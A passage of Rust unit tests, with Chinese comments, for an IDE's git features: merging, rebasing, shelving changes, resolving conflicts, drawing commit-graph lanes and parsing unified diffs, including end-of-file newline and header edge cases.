        assert_eq!(log[1].hash, c1);

        let patch = git_commit_patch(repo_arg.clone(), log[0].hash.clone()).unwrap();
        assert!(patch.contains("all in one"), "完整提交消息应包含正文");

        // f1, f2, f3 均存在
        assert!(repo.join("f1.txt").exists());
        assert!(repo.join("f2.txt").exists());
        assert!(repo.join("f3.txt").exists());

        let _ = fs::remove_dir_all(&base);
    }

    /// merge 创建合并提交；rebase 把本地提交变基到 ref 之上
    #[test]
    fn merge_and_rebase() {
        let (base, repo, repo_arg) = setup_repo("ide_menu_merge");
        let commit = |msg: &'static str| {
            vec![
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                msg,
            ]
        };

        write(&repo.join("a.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit("base"));
        git(&repo, &["checkout", "-qb", "feat"]);
        write(&repo.join("f.txt"), "f\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit("feat-work"));
        git(&repo, &["checkout", "-q", "main"]);
        write(&repo.join("m.txt"), "m\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit("main-work"));

        // merge feat 到 main → 合并提交
        git_merge(repo_arg.clone(), "feat".to_string()).unwrap();
        let log = git_log_impl(repo_arg.clone(), Some(5), None, None, None, None).unwrap();
        assert_eq!(log[0].is_merge, Some(true));

        // rebase 场景：从 base 分叉的 old-feat 变基到 main
        git(&repo, &["checkout", "-qb", "old-feat", "main~1"]);
        write(&repo.join("o.txt"), "o\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit("old-work"));
        git_rebase(repo_arg.clone(), "main".to_string()).unwrap();
        let log = git_log_impl(repo_arg.clone(), Some(6), None, None, None, None).unwrap();
        assert!(
            log.iter().any(|c| c.message == "old-work"),
            "rebase 后 old-work 应保留"
        );
        // old-feat 现在基于 main（包含 m.txt 的提交）
        assert!(repo.join("m.txt").exists());

        let _ = fs::remove_dir_all(&base);
    }
}

#[cfg(test)]
mod final_feature_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    fn write(path: &Path, content: &str) {
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, content).unwrap();
    }

    fn setup_repo(name: &str) -> (std::path::PathBuf, std::path::PathBuf, Option<String>) {
        let base = std::env::temp_dir().join(format!("{}_{}", name, std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        git(&repo, &["config", "user.name", "t"]);
        git(&repo, &["config", "user.email", "t@t.com"]);
        (base, repo.clone(), Some(repo.to_string_lossy().to_string()))
    }

    /// gutter 变更块：新增/修改/删除行的行号解析
    #[test]
    fn file_change_hunks_parse_ranges() {
        let (base, repo, repo_arg) = setup_repo("ide_hunks");

        write(&repo.join("a.txt"), "l1\nl2\nl3\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "c1"]);

        // 修改第 2 行 + 末尾追加第 4 行
        write(&repo.join("a.txt"), "l1\nl2-changed\nl3\nl4-new\n");
        let hunks = git_file_change_hunks_impl(repo_arg.clone(), "a.txt".to_string()).unwrap();
        assert!(
            hunks
                .iter()
                .any(|h| h.kind == "modified" && h.start_line == 2 && h.end_line == 2),
            "{:?}",
            hunks
        );
        assert!(
            hunks.iter().any(|h| h.kind == "added" && h.start_line == 4),
            "{:?}",
            hunks
        );

        // 删除末尾行：删除标记落在保留内容的起始位置
        write(&repo.join("b.txt"), "x1\nx2\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "c2"]);
        write(&repo.join("b.txt"), "x1\n");
        let hunks = git_file_change_hunks_impl(repo_arg, "b.txt".to_string()).unwrap();
        assert!(
            hunks
                .iter()
                .any(|h| h.kind == "removed" && h.start_line == 1),
            "{:?}",
            hunks
        );

        let _ = fs::remove_dir_all(&base);
    }

    /// 交互式变基：drop 与 fixup 通过 todo 脚本一次完成
    #[test]
    fn interactive_rebase_applies_todo() {
        let (base, repo, repo_arg) = setup_repo("ide_rebase_i");
        let head_hash = || {
            let out =
                git_output(git_cmd().arg("-C").arg(&repo).args(["rev-parse", "HEAD"])).unwrap();
            String::from_utf8_lossy(&out.stdout).trim().to_string()
        };

        write(&repo.join("a.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "base"]);
        let base_hash = head_hash();
        write(&repo.join("b.txt"), "2\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "one"]);
        let one_hash = head_hash();
        write(&repo.join("c.txt"), "3\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "two"]);
        let _two_hash = head_hash();
        write(&repo.join("d.txt"), "4\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "three"]);
        let three_hash = head_hash();

        // 保留 one，drop two，three fixup 进 one
        let todo = vec![
            format!("pick {}", one_hash),
            "drop".to_string() + &format!(" {}", _two_hash),
            format!("fixup {}", three_hash),
        ];
        git_rebase_interactive(repo_arg.clone(), base_hash, todo).unwrap();

        let log = git_log_impl(repo_arg.clone(), Some(10), None, None, None, None).unwrap();
        assert!(!log.iter().any(|c| c.message == "two"), "two 应被 drop");
        assert!(
            !log.iter().any(|c| c.message == "three"),
            "three 应被 fixup 进 one"
        );
        assert!(log.iter().any(|c| c.message == "one"));
        // fixup 保留更改：b 与 d 存在，被 drop 的 c 不存在
        assert!(repo.join("b.txt").exists());
        assert!(repo.join("d.txt").exists());
        assert!(!repo.join("c.txt").exists());

        let _ = fs::remove_dir_all(&base);
    }

    /// Shelve：保存补丁 → 回滚工作区 → 应用恢复 → 删除
    #[test]
    fn shelve_save_apply_delete_roundtrip() {
        let (base, repo, repo_arg) = setup_repo("ide_shelve");

        write(&repo.join("a.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "c1"]);

        write(&repo.join("a.txt"), "2-wip\n");
        let patch = git_diff_patch(repo_arg.clone(), None, None).unwrap();
        assert!(patch.contains("2-wip"));
        git_shelve_save(repo_arg.clone(), "wip-工作".to_string(), patch).unwrap();

        let shelves = git_list_shelves(repo_arg.clone()).unwrap();
        assert_eq!(shelves.len(), 1);
        assert_eq!(shelves[0].name, "wip-工作");

        // 回滚工作区后从贮藏架恢复
        git(&repo, &["checkout", "--", "."]);
        assert_eq!(fs::read_to_string(repo.join("a.txt")).unwrap(), "1\n");
        git_apply_shelf(repo_arg.clone(), "wip-工作".to_string()).unwrap();
        assert_eq!(fs::read_to_string(repo.join("a.txt")).unwrap(), "2-wip\n");

        git_delete_shelf(repo_arg.clone(), "wip-工作".to_string()).unwrap();
        assert!(git_list_shelves(repo_arg).unwrap().is_empty());

        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn shelf_rename_read_delete_file_restore_flow() {
        let (base, repo, repo_arg) = setup_repo("ide_shelf_flow");
        write(&repo.join("a.txt"), "1\n");
        write(&repo.join("b.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "c1"]);

        write(&repo.join("a.txt"), "2-a\n");
        write(&repo.join("b.txt"), "2-b\n");
        let patch = git_diff_patch(repo_arg.clone(), None, None).unwrap();
        git_shelve_save(repo_arg.clone(), "my-shelf".to_string(), patch).unwrap();

        // 1. 读取单文件与全量补丁
        let patch_full =
            git_read_shelf_patch(repo_arg.clone(), "my-shelf".to_string(), None, None).unwrap();
        assert!(patch_full.contains("a.txt") && patch_full.contains("b.txt"));
        let patch_a = git_read_shelf_patch(
            repo_arg.clone(),
            "my-shelf".to_string(),
            Some("a.txt".to_string()),
            None,
        )
        .unwrap();
        assert!(patch_a.contains("a.txt") && !patch_a.contains("b.txt"));
        let patch_multi = git_read_shelf_patch(
            repo_arg.clone(),
            "my-shelf".to_string(),
            None,
            Some(vec!["b.txt".to_string()]),
        )
        .unwrap();
        assert!(patch_multi.contains("b.txt") && !patch_multi.contains("a.txt"));

        // 2. 重命名
        git_rename_shelf(
            repo_arg.clone(),
            "my-shelf".to_string(),
            "renamed-shelf".to_string(),
        )
        .unwrap();
        let list = git_list_shelves(repo_arg.clone()).unwrap();
        assert_eq!(list[0].name, "renamed-shelf");

        // 3. 批量删除文件
        git_delete_shelf_files(
            repo_arg.clone(),
            "renamed-shelf".to_string(),
            vec!["a.txt".to_string()],
        )
        .unwrap();
        let list_after_del_file = git_list_shelves(repo_arg.clone()).unwrap();
        assert_eq!(list_after_del_file[0].files, vec!["b.txt".to_string()]);

        // 4. 删除进入「最近删除」
        git_delete_shelf(repo_arg.clone(), "renamed-shelf".to_string()).unwrap();
        assert!(git_list_shelves(repo_arg.clone()).unwrap().is_empty());
        let deleted = git_list_deleted_shelves(repo_arg.clone()).unwrap();
        assert_eq!(deleted.len(), 1);
        assert_eq!(deleted[0].name, "renamed-shelf");

        // 5. 从「最近删除」恢复
        git_restore_shelf(repo_arg.clone(), "renamed-shelf".to_string()).unwrap();
        assert_eq!(git_list_shelves(repo_arg.clone()).unwrap().len(), 1);
        assert!(git_list_deleted_shelves(repo_arg.clone())
            .unwrap()
            .is_empty());

        let _ = fs::remove_dir_all(&base);
    }

    /// 冲突：制造 both-modified，三方内容可读，--ours/--theirs 与 stage 可用，status 为 C
    #[test]
    fn merge_conflict_flow() {
        let (base, repo, repo_arg) = setup_repo("ide_conflict");

        write(&repo.join("a.txt"), "base\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "base"]);
        git(&repo, &["checkout", "-qb", "feat"]);
        write(&repo.join("a.txt"), "theirs\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "feat"]);
        git(&repo, &["checkout", "-q", "main"]);
        write(&repo.join("a.txt"), "ours\n");
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "main"]);

        let merge = git_merge(repo_arg.clone(), "feat".to_string());
        assert!(merge.is_err(), "同文件不同改动应冲突");

        let status = git_status_impl(repo_arg.clone()).unwrap();
        let conflicted = status.iter().find(|f| f.path == "a.txt").unwrap();
        assert_eq!(conflicted.status, "C", "冲突文件应归一化为 C");

        let content = tauri::async_runtime::block_on(git_merge_file_content(
            repo_arg.clone(),
            "a.txt".to_string(),
        ))
        .unwrap();
        assert_eq!(content.ours, "ours\n");
        assert_eq!(content.theirs, "theirs\n");
        assert_eq!(content.base.as_deref(), Some("base\n"));
        assert!(content.worktree.contains("<<<<<<<"));

        // 采用本地一方后冲突消除
        tauri::async_runtime::block_on(git_use_merge_side(
            repo_arg.clone(),
            "a.txt".to_string(),
            "ours".to_string(),
        ))
        .unwrap();
        let status = git_status_impl(repo_arg).unwrap();
        assert!(
            !status.iter().any(|f| f.status == "C"),
            "采用一方后不应再有冲突"
        );

        let _ = fs::remove_dir_all(&base);
    }

    /// 回归：勾选位于忽略目录内、但已经被 git 跟踪的文件（如 .idea/.gitignore）
    /// 不能因父目录命中 .gitignore 而让整次提交失败；未跟踪的忽略文件应被跳过。
    #[test]
    fn partial_commit_handles_tracked_files_inside_ignored_dir() {
        let base = std::env::temp_dir().join(format!("ide_commit_ignored_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());
        let commit_args = [
            "-c",
            "user.email=t@t.com",
            "-c",
            "user.name=t",
            "commit",
            "-qm",
            "c1",
        ];

        write(&repo.join(".gitignore"), ".idea/\n");
        write(&repo.join(".idea/.gitignore"), "old\n");
        write(&repo.join("a.txt"), "1\n");
        git(&repo, &["add", ".gitignore", "a.txt"]);
        git(&repo, &["add", "-f", ".idea/.gitignore"]);
        git(&repo, &commit_args);

        write(&repo.join(".idea/.gitignore"), "new\n");
        write(&repo.join(".idea/untracked.xml"), "ignored\n");
        write(&repo.join("a.txt"), "2\n");

        git_commit(
            repo_arg,
            "partial ignored".to_string(),
            false,
            Some(vec![
                ".idea/.gitignore".to_string(),
                ".idea/untracked.xml".to_string(),
                "a.txt".to_string(),
            ]),
        )
        .unwrap();

        let mut show = git_cmd();
        show.arg("-C")
            .arg(&repo)
            .args(["show", "--name-only", "--format=", "HEAD"]);
        let out = git_output(&mut show).unwrap();
        let names = String::from_utf8_lossy(&out.stdout);
        assert!(names.lines().any(|p| p == ".idea/.gitignore"));
        assert!(names.lines().any(|p| p == "a.txt"));
        assert!(!names.lines().any(|p| p == ".idea/untracked.xml"));

        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn partial_commit_handles_staged_cached_deletions() {
        let base = std::env::temp_dir().join(format!("ide_commit_cached_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());
        let commit_args = [
            "-c",
            "user.email=t@t.com",
            "-c",
            "user.name=t",
            "commit",
            "-qm",
            "c1",
        ];

        write(&repo.join("bin.dat"), "binary content\n");
        write(&repo.join("keep.txt"), "keep\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit_args);

        // untrack bin.dat: git rm --cached and add to .gitignore
        write(&repo.join(".gitignore"), "bin.dat\n");
        git(&repo, &["add", ".gitignore"]);
        git(&repo, &["rm", "--cached", "bin.dat"]);

        // 仅勾选 bin.dat 进行提交
        git_commit(
            repo_arg.clone(),
            "untrack bin.dat".to_string(),
            false,
            Some(vec!["bin.dat".to_string()]),
        )
        .expect("提交暂存区缓存删除文件应成功，不能被 ls-files 误判为已忽略未跟踪而拒绝");

        let mut show = git_cmd();
        show.arg("-C")
            .arg(&repo)
            .args(["show", "--name-only", "--format=", "HEAD"]);
        let out = git_output(&mut show).unwrap();
        let names = String::from_utf8_lossy(&out.stdout);
        assert!(
            names.lines().any(|p| p == "bin.dat"),
            "HEAD 应包含 bin.dat 的删除记录"
        );
        assert!(repo.join("bin.dat").exists(), "本地磁盘上的文件应继续保留");

        let _ = fs::remove_dir_all(&base);
    }
}

#[cfg(test)]
mod graph_lane_tests {
    use super::*;

    fn h(s: &str) -> String {
        s.to_string()
    }

    #[test]
    fn linear_commits_share_lane_zero() {
        let hashes = vec![h("c3"), h("c2"), h("c1")];
        let parents = vec![vec![h("c2")], vec![h("c1")], vec![]];
        let (rows, _) = assign_graph_lanes(&hashes, &parents);

        assert!(rows.iter().all(|r| r.node == 0));
        assert!(rows
            .iter()
            .all(|r| r.ins.is_empty() && r.straight.is_empty()));
        assert_eq!(rows[0].outs, vec![GraphEdgeDto { from: 0, to: 0 }]);
        assert_eq!(
            rows[2].outs,
            Vec::<GraphEdgeDto>::new(),
            "根提交没有出发连线"
        );
    }

    #[test]
    fn fork_and_merge_diamond() {
        // 结构: base 根；a1->base, a2->a1；b1->base；M 合并 (a2, b1)
        // git log 顺序（新→旧）: M, a2, b1, a1, base
        let hashes = vec![h("M"), h("a2"), h("b1"), h("a1"), h("base")];
        let parents = vec![
            vec![h("a2"), h("b1")],
            vec![h("a1")],
            vec![h("base")],
            vec![h("base")],
            vec![],
        ];
        let (rows, _) = assign_graph_lanes(&hashes, &parents);

        // M 在轨道 0，第一父 a2 接管轨道 0，第二父 b1 开新轨道 1
        assert_eq!(rows[0].node, 0);
        assert_eq!(
            rows[0].outs,
            vec![
                GraphEdgeDto { from: 0, to: 0 },
                GraphEdgeDto { from: 0, to: 1 }
            ]
        );

        // a2 在轨道 0，b1 的轨道 1 径直穿过
        assert_eq!(rows[1].node, 0);
        assert_eq!(rows[1].straight, vec![1]);

        // b1 在轨道 1，main 线穿过
        assert_eq!(rows[2].node, 1);
        assert_eq!(rows[2].straight, vec![0]);

        // a1 在轨道 0
        assert_eq!(rows[3].node, 0);
        assert_eq!(rows[3].straight, vec![1]);

        // base 被两条分支同时期待：一条来自轨道 1 的汇入连线
        assert_eq!(rows[4].node, 0);
        assert_eq!(rows[4].ins, vec![1]);
        assert!(rows[4].outs.is_empty());
    }

    #[test]
    fn truncated_parents_keep_lane_running_to_bottom() {
        // 日志截断：最后一行的父提交不在列表中，轨道应保持期待且不崩溃
        let hashes = vec![h("c2"), h("c1")];
        let parents = vec![vec![h("c1")], vec![h("missing")]];
        let (rows, _) = assign_graph_lanes(&hashes, &parents);

        assert_eq!(rows[0].node, 0);
        assert_eq!(rows[1].node, 0);
        assert!(rows[1].ins.is_empty());
        assert_eq!(rows[1].outs, vec![GraphEdgeDto { from: 0, to: 0 }]);
    }

    #[test]
    fn multiple_roots_get_separate_lanes() {
        let hashes = vec![h("x"), h("y")];
        let parents = vec![vec![], vec![]];
        let (rows, _) = assign_graph_lanes(&hashes, &parents);

        assert_eq!(rows[0].node, 0);
        assert_eq!(rows[1].node, 1);
    }

    #[test]
    fn parse_upstream_track_variants() {
        assert_eq!(parse_upstream_track("[ahead 2, behind 1]"), (2, 1));
        assert_eq!(parse_upstream_track("[ahead 5]"), (5, 0));
        assert_eq!(parse_upstream_track("[behind 3]"), (0, 3));
        assert_eq!(parse_upstream_track(""), (0, 0));
        assert_eq!(parse_upstream_track("[gone]"), (0, 0));
    }
}

#[cfg(test)]
mod path_decode_tests {
    use super::*;

    #[test]
    fn plain_path_untouched() {
        assert_eq!(decode_git_path("src/main.rs"), "src/main.rs");
        assert_eq!(decode_git_path("  src/lib.rs  "), "src/lib.rs");
    }

    #[test]
    fn quoted_octal_escapes_decoded_to_utf8() {
        // git core.quotepath 输出: "页面设计参考图" -> "\351\241\265..."（页 的 UTF-8 字节）
        let quoted = "\"\\351\\241\\265\\351\\235\\242/x.png\"";
        assert_eq!(decode_git_path(quoted), "页面/x.png");
    }

    #[test]
    fn quoted_ascii_path_stripped() {
        assert_eq!(decode_git_path("\"a b.txt\""), "a b.txt");
    }
}

#[cfg(test)]
mod diff_tests {
    use super::*;
    /// 断言行尾的投影元组：kind / old_line / new_line / text / eof 标记。
    /// 多个测试都要把 `DiffLine` 摊平成可比较的元组，故抽成别名。
    type LineTuple<'a> = (&'a str, Option<u32>, Option<u32>, &'a str, Option<bool>);
    const SAMPLE: &str = "\
diff --git a/src/main.rs b/src/main.rs
index 1111111..2222222 100644
--- a/src/main.rs
+++ b/src/main.rs
@@ -10,7 +10,8 @@ fn main() {
     let a = 1;
-    let b = 2;
+    let b = 3;
+    let c = 4;
     println!(\"{a}\");
 }
";

    #[test]
    fn parses_hunk_header_line_numbers() {
        let (lines, additions, deletions) = parse_unified_diff(SAMPLE);

        let hunk = lines
            .iter()
            .find(|l| l.kind == "hunk")
            .expect("缺少 hunk 行");
        assert_eq!(hunk.text, "@@ -10,7 +10,8 @@ fn main() {");

        // 首行上下文应是旧 10 / 新 10
        let first_context = lines
            .iter()
            .find(|l| l.kind == "context")
            .expect("缺少上下文行");
        assert_eq!(first_context.old_line, Some(10));
        assert_eq!(first_context.new_line, Some(10));

        assert_eq!(additions, 2);
        assert_eq!(deletions, 1);
    }

    #[test]
    fn add_lines_only_carry_new_line_numbers() {
        let (lines, _, _) = parse_unified_diff(SAMPLE);
        for line in lines.iter().filter(|l| l.kind == "add") {
            assert!(line.new_line.is_some(), "新增行缺少新行号");
            assert!(line.old_line.is_none(), "新增行不应有旧行号");
        }
    }

    #[test]
    fn del_lines_only_carry_old_line_numbers() {
        let (lines, _, _) = parse_unified_diff(SAMPLE);
        for line in lines.iter().filter(|l| l.kind == "del") {
            assert!(line.old_line.is_some(), "删除行缺少旧行号");
            assert!(line.new_line.is_none(), "删除行不应有新行号");
        }
        // 删除行内容不应包含前导 '-'
        let del = lines.iter().find(|l| l.kind == "del").unwrap();
        assert_eq!(del.text, "    let b = 2;");
    }

    #[test]
    fn eof_newline_only_diff_becomes_blank_tail_deletion() {
        // 用户场景：旧文件 49 行以换行结尾（编辑器里第 50 行是空白行），
        // 新文件末行 } 无换行。git 输出 -}/+}/\ No newline，直接渲染像「删了一行
        // 又加了一行」；归整后 = 内容行不变 + 第 50 行空白行被删除（PyCharm 形态）。
        let text = concat!(
            "@@ -46,4 +46,4 @@\n",
            "       \"debugApplicationIdSuffix\": \".debug\"\n",
            "     }\n",
            "   }\n",
            "-}\n",
            "+}\n",
            "\\ No newline at end of file\n"
        );
        let (lines, additions, deletions) = parse_unified_diff(text);

        assert_eq!((additions, deletions), (0, 1), "只该有「一个空白行被删」");
        let tail: Vec<LineTuple> = lines
            .iter()
            .map(|l| {
                (
                    l.kind.as_str(),
                    l.old_line,
                    l.new_line,
                    l.text.as_str(),
                    l.eof_no_newline,
                )
            })
            .collect();
        assert_eq!(
            tail[tail.len() - 2..],
            [
                // } 内容未变 → context，两侧行号一致
                ("context", Some(49), Some(49), "}", None),
                // 旧文件的空白尾行 → 可见的删除行，带 EOF 标记
                ("del", Some(50), None, "", Some(true)),
            ]
        );
        assert!(
            !lines.iter().any(|l| l.text.contains("No newline")),
            "标记行不应出现在正文里"
        );
        // 普通（非 EOF）差异不受影响
        let (sample_lines, _, _) = parse_unified_diff(SAMPLE);
        assert_eq!(sample_lines.iter().filter(|l| l.kind == "del").count(), 1);
        assert_eq!(sample_lines.iter().filter(|l| l.kind == "add").count(), 2);
    }

    #[test]
    fn explicit_blank_del_plus_eof_marker_normalizes_to_context() {
        // git 黄金样本：-}\n-\n+}\n\ No newline（空白尾行被显式输出）。
        // 归整后同样收敛为「} 不变 + 空白行删除」，与上面纯折叠形态输出一致。
        let text = concat!(
            "@@ -1,3 +1,2 @@\n",
            " line48\n",
            "-}\n",
            "-\n",
            "+}\n",
            "\\ No newline at end of file\n"
        );
        let (lines, additions, deletions) = parse_unified_diff(text);

        assert_eq!((additions, deletions), (0, 1));
        let kinds: Vec<&str> = lines.iter().map(|l| l.kind.as_str()).collect();
        assert_eq!(kinds, vec!["hunk", "context", "context", "del"]);
        let blank = lines.last().unwrap();
        assert_eq!(
            (blank.old_line, blank.text.as_str(), blank.eof_no_newline),
            (Some(3), "", Some(true))
        );
        let ctx = &lines[2];
        assert_eq!(
            (ctx.old_line, ctx.new_line, ctx.text.as_str()),
            (Some(2), Some(2), "}")
        );
    }

    #[test]
    fn cap_diff_lines_truncates_only_display_rows() {
        use super::{cap_diff_lines, MAX_DIFF_LINES};
        fn make_line(kind: &str, text: &str) -> super::DiffLineDto {
            super::DiffLineDto {
                kind: kind.to_string(),
                old_line: None,
                new_line: None,
                text: text.to_string(),
                no_newline: None,
                eof_no_newline: None,
            }
        }
        // 未超限：原样返回、无标记（不制造多余分配语义变化）
        let small = vec![make_line("context", "x")];
        let (out, truncated) = cap_diff_lines(small);
        assert_eq!(out.len(), 1);
        assert_eq!(truncated, None);

        // 超限：截到上限 + 标记。调用方（4 个 FileDiffDto 构造点）的增删计数
        // 在解析期已算完，不受截断影响——计数永远是全量的。
        let big: Vec<super::DiffLineDto> = (0..MAX_DIFF_LINES + 500)
            .map(|i| make_line("context", &format!("l{i}")))
            .collect();
        let (out, truncated) = cap_diff_lines(big);
        assert_eq!(out.len(), MAX_DIFF_LINES);
        assert_eq!(truncated, Some(true));
        assert_eq!(out.last().unwrap().text, format!("l{}", MAX_DIFF_LINES - 1));
    }

    #[test]
    fn added_trailing_newline_becomes_blank_tail_addition() {
        // 反方向：旧文件末行无换行 → 新文件以换行结尾（多出一个空白尾行）
        let text = concat!(
            "@@ -1,2 +1,2 @@\n",
            " a\n",
            "-b\n",
            "\\ No newline at end of file\n",
            "+b\n"
        );
        let (lines, additions, deletions) = parse_unified_diff(text);

        assert_eq!((additions, deletions), (1, 0));
        let tail: Vec<LineTuple> = lines
            .iter()
            .map(|l| {
                (
                    l.kind.as_str(),
                    l.old_line,
                    l.new_line,
                    l.text.as_str(),
                    l.eof_no_newline,
                )
            })
            .collect();
        assert_eq!(
            tail[tail.len() - 2..],
            [
                ("context", Some(2), Some(2), "b", None),
                ("add", None, Some(3), "", Some(true)),
            ]
        );
    }

    #[test]
    fn eof_marker_without_matching_pair_is_left_alone() {
        // 末行是真实新增且无换行：没有可归整的配对，保持原样只带标记
        let text = concat!(
            "@@ -1,1 +1,2 @@\n",
            " a\n",
            "+b\n",
            "\\ No newline at end of file\n"
        );
        let (lines, additions, deletions) = parse_unified_diff(text);
        assert_eq!((additions, deletions), (1, 0));
        let last = lines.last().unwrap();
        assert_eq!(
            (last.kind.as_str(), last.text.as_str(), last.eof_no_newline),
            ("add", "b", Some(true))
        );
    }

    #[test]
    fn add_line_numbers_advance_after_deletion() {
        // 第一处新增应为新行号 11（旧 11 被删，新增补上）
        let (lines, _, _) = parse_unified_diff(SAMPLE);
        let adds: Vec<_> = lines.iter().filter(|l| l.kind == "add").collect();
        assert_eq!(adds[0].new_line, Some(11));
        assert_eq!(adds[1].new_line, Some(12));
    }

    #[test]
    fn marks_meta_lines_separately_from_context() {
        let (lines, _, _) = parse_unified_diff(SAMPLE);
        let meta_count = lines.iter().filter(|l| l.kind == "meta").count();
        assert_eq!(
            meta_count, 4,
            "diff --git / index / --- / +++ 共 4 条应标为 meta"
        );
        assert!(lines
            .iter()
            .all(|l| l.kind != "context" || !l.text.starts_with("diff --git")));
    }

    #[test]
    fn empty_diff_yields_nothing() {
        let (lines, additions, deletions) = parse_unified_diff("");
        assert!(lines.is_empty());
        assert_eq!(additions, 0);
        assert_eq!(deletions, 0);
    }

    #[test]
    fn detects_new_file() {
        let text = "diff --git a/x b/x\nnew file mode 100644\nindex 000..111\n--- /dev/null\n+++ b/x\n@@ -0,0 +1,2 @@\n+a\n+b\n";
        let (lines, additions, deletions) = parse_unified_diff(text);
        assert_eq!(additions, 2);
        assert_eq!(deletions, 0);
        assert!(
            patch_header_flags(&lines).is_new,
            "文件级 `new file mode` 头行应判为新增"
        );
    }

    /// 用户报告场景（`src-tauri/src/commands.rs` 打不开 diff、页面空白）：
    /// 补丁正文原样携带源码行，而该文件自己就含 `text.contains("Binary files")`
    /// 这类字面量。旧的裸子串判定（`text.contains("Binary files")`）把它标成
    /// 二进制 → 前端既不挂 DiffEditor、行渲染又要求 `!isBinary`，整块内容区空白；
    /// `new file mode` / `deleted file mode` 同理，会把普通修改标成新增/删除文件。
    #[test]
    fn header_flags_ignore_marker_literals_in_patch_body() {
        let text = "\
diff --git a/src/commands.rs b/src/commands.rs
index 1111111..2222222 100644
--- a/src/commands.rs
+++ b/src/commands.rs
@@ -10,7 +10,8 @@ fn probe() {
     let is_binary = text.contains(\"Binary files\");
-    let is_new = text.contains(\"new file mode\");
+    let is_new = patch_header_flags(&lines).is_new;
+    let is_deleted = text.contains(\"deleted file mode\");
 }
";
        let (lines, additions, deletions) = parse_unified_diff(text);

        // 正文行的分类不受影响
        let body: Vec<(&str, &str)> = lines
            .iter()
            .filter(|l| l.kind != "meta")
            .map(|l| (l.kind.as_str(), l.text.as_str()))
            .collect();
        assert!(body.contains(&(
            "context",
            "    let is_binary = text.contains(\"Binary files\");"
        )));
        assert!(body.contains(&("del", "    let is_new = text.contains(\"new file mode\");")));
        assert!(body.contains(&(
            "add",
            "    let is_deleted = text.contains(\"deleted file mode\");"
        )));
        assert_eq!((additions, deletions), (2, 1));

        // 文件级标志只认头行：正文里的字面量一个都不能翻转
        assert_eq!(
            patch_header_flags(&lines),
            PatchHeaderFlags::default(),
            "正文含 Binary files / new file mode / deleted file mode 字面量不得改变文件级标志"
        );
    }

    #[test]
    fn header_flags_detect_real_binary_and_deleted_headers() {
        let binary = "diff --git a/logo.png b/logo.png\nindex 1111111..2222222 100644\nBinary files a/logo.png and b/logo.png differ\n";
        let (lines, _, _) = parse_unified_diff(binary);
        assert!(
            patch_header_flags(&lines).is_binary,
            "真二进制补丁必须被标出"
        );
        assert_eq!(
            lines.iter().filter(|l| l.kind != "meta").count(),
            0,
            "二进制补丁没有可展示的正文行"
        );

        let deleted = "diff --git a/gone.txt b/gone.txt\ndeleted file mode 100644\nindex 1111111..0000000\n--- a/gone.txt\n+++ /dev/null\n@@ -1 +0,0 @@\n-bye\n";
        let (lines, _, _) = parse_unified_diff(deleted);
        let flags = patch_header_flags(&lines);
        assert!(flags.is_deleted && !flags.is_new && !flags.is_binary);
    }

    /// 审计 6.2 回归：hunk 正文里「删除了一行内容为 `-- foo`」的 diff 行是
    /// `--- foo`，与删除侧文件头同形。旧实现先按前缀判头部 → 该行被标成 meta
    /// （前端过滤 meta → 用户以为没改），且行号与增删计数整体偏移。
    #[test]
    fn deleted_double_dash_line_stays_in_hunk() {
        let text = "\
diff --git a/f.sql b/f.sql
index 1111111..2222222 100644
--- a/f.sql
+++ b/f.sql
@@ -1,3 +1,2 @@ keep
 line1
--- foo
 line2
";
        let (lines, additions, deletions) = parse_unified_diff(text);
        let del = lines
            .iter()
            .find(|l| l.kind == "del")
            .expect("`-- foo` 删除行必须解析为 del");
        assert_eq!(del.text, "-- foo");
        assert_eq!(del.old_line, Some(2), "旧行号必须连续递增");
        assert_eq!(additions, 0);
        assert_eq!(deletions, 1);
        // 文件头仍是 meta（diff --git / index / --- / +++）
        assert_eq!(lines.iter().filter(|l| l.kind == "meta").count(), 4);
        // 紧随其后的上下文行不能被整体偏移
        let ctx = lines
            .iter()
            .find(|l| l.kind == "context" && l.text == "line2")
            .expect("hunk 尾部上下文行");
        assert_eq!(ctx.old_line, Some(3));
        assert_eq!(ctx.new_line, Some(2));
    }

    /// 审计 6.2 回归（同根因的另一半）：正文里「新增了一行 `++ x`」的输出是
    /// `+++ x`，按段头解析会把该段判成别的文件，从而静默丢弃整个文件段
